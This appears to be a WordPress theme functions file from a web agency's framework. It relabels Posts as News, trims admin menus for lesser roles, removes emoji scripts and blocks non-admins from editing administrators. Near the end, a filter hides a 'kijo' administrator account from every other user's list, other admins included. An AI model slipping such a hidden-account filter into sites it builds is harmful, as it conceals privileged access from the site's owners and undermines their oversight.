<?php
/** 
KIJO Framework
Project Specific Settings

Version 0.1
**/

/************************************************************************************
** Add Class to homepage in nav menu 
*************************************************************************************/

function add_slug_class_to_menu_item($output){
	$ps = get_option('permalink_structure');
	if(!empty($ps)){
		$idstr = preg_match_all('/<li id="menu-item-(\d+)/', $output, $matches);
		foreach($matches[1] as $mid){
			$id = get_post_meta($mid, '_menu_item_object_id', true);
			$slug = basename(get_permalink($id));
			$output = preg_replace('/menu-item-'.$mid.'">/', 'menu-item-'.$mid.' menu-item-'.$slug.'">', $output, 1);
		}
	}
	return $output;
}
add_filter('wp_nav_menu', 'add_slug_class_to_menu_item');


/************************************************************************************
** Change name of 'Posts' to 'News'
*************************************************************************************/

function kijo_change_post_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'News';
    $submenu['edit.php'][5][0] = 'News';
    $submenu['edit.php'][10][0] = 'Add News';
    $submenu['edit.php'][16][0] = 'News Tags';
    echo '';
}
function kijo_change_post_object() {
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'News';
    $labels->singular_name = 'News';
    $labels->add_new = 'Add News';
    $labels->add_new_item = 'Add News';
    $labels->edit_item = 'Edit News';
    $labels->new_item = 'News';
    $labels->view_item = 'View News';
    $labels->search_items = 'Search News';
    $labels->not_found = 'No News found';
    $labels->not_found_in_trash = 'No News found in Trash';
    $labels->all_items = 'All News';
    $labels->menu_name = 'News';
    $labels->name_admin_bar = 'News';
}
 
add_action( 'admin_menu', 'kijo_change_post_label' );
add_action( 'init', 'kijo_change_post_object' );


/************************************************************************************
* Change Admin User Interface for Custom Post Types
*************************************************************************************/

/*add_action('do_meta_boxes', 'slider_image_box');
function slider_image_box() {

	$post_types = array(
		'slider',
		'kitchens',
		'page',
	);

	remove_meta_box( 'postimagediv', $post_types, 'side' );
	remove_meta_box( 'revisionsdiv', $post_types, 'normal' );
	
	add_meta_box('postimagediv', __('Header Background Image'), 'post_thumbnail_meta_box', $post_types, 'advanced', 'high');

}


// Remove featured image box completely 
add_action('do_meta_boxes', 'remove_slider_image_box');
function remove_slider_image_box() {

	$post_types = array(
		'casestudies'
	);

	remove_meta_box( 'postimagediv', $post_types, 'side' );
	remove_meta_box( 'revisionsdiv', $post_types, 'normal' );

}*/


/************************************************************************************
**  Excerpt Length 
*************************************************************************************/

function custom_excerpt_length( $length ) {
	return 20;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );


/************************************************************************************
**  Remove admin pages
*************************************************************************************/

add_action( 'admin_menu', 'my_remove_menu_pages' );
 
function my_remove_menu_pages() {
  // If the user does not have access to publish posts
  if(!current_user_can('activate_plugins')) {
	  //remove_menu_page('tools.php');
	  //remove_submenu_page('themes.php', 'widgets.php');
	  remove_menu_page('link-manager.php');
		remove_menu_page('plugins.php');
	  remove_menu_page('edit-comments.php');
	  remove_menu_page('options-permalink.php');
	  remove_submenu_page('options-general.php', 'options-privacy.php');
	  remove_submenu_page('options-general.php', 'options-permalink.php');
	  remove_submenu_page('options-general.php', 'options-reading.php');
	  remove_submenu_page('options-general.php', 'options-general.php');
	} 
	/*else if (!current_user_can('moderate_comments')) {
	remove_menu_page('edit-comments.php');
	}*/
}


/************************************************************************************
**  Add Menu Order Columns
*************************************************************************************/

/*add_filter('manage_slider_posts_columns', 'my_columns');
function my_columns($columns) {
    $columns['order'] = 'Order';
    return $columns;
}

add_action('manage_slider_posts_custom_column',  'my_show_columns');
function my_show_columns($name) {
    global $post;
    switch ($name) {
        case 'order':
            $views = $post->menu_order;
            echo $views;
    }
}*/


/************************************************************************************
**  Remove emoji code from header
*************************************************************************************/

remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );


/************************************************************************************
**  Stop administrator account being deleted
*************************************************************************************/

// Hide admin account 
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
 
  if ($username == 'kijo') { 
 
  }
 
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'kijo'",$user_search->query_where);
  }
}


class JPB_User_Caps {

  // Add our filters
  function JPB_User_Caps(){
    add_filter( 'editable_roles', array(&$this, 'editable_roles'));
    add_filter( 'map_meta_cap', array(&$this, 'map_meta_cap'),10,4);
  }

  // Remove 'Administrator' from the list of roles if the current user is not an admin
  function editable_roles( $roles ){
    if( isset( $roles['administrator'] ) && !current_user_can('administrator') ){
      unset( $roles['administrator']);
    }
    return $roles;
  }

  // If someone is trying to edit or delete and admin and that user isn't an admin, don't allow it
  function map_meta_cap( $caps, $cap, $user_id, $args ){

    switch( $cap ){
        case 'edit_user':
        case 'remove_user':
        case 'promote_user':
            if( isset($args[0]) && $args[0] == $user_id )
                break;
            elseif( !isset($args[0]) )
                $caps[] = 'do_not_allow';
            $other = new WP_User( absint($args[0]) );
            if( $other->has_cap( 'administrator' ) ){
                if(!current_user_can('administrator')){
                    $caps[] = 'do_not_allow';
                }
            }
            break;
        case 'delete_user':
        case 'delete_users':
            if( !isset($args[0]) )
                break;
            $other = new WP_User( absint($args[0]) );
            if( $other->has_cap( 'administrator' ) ){
                if(!current_user_can('administrator')){
                    $caps[] = 'do_not_allow';
                }
            }
            break;
        default:
            break;
    }
    return $caps;
  }

}

$jpb_user_caps = new JPB_User_Caps();


?>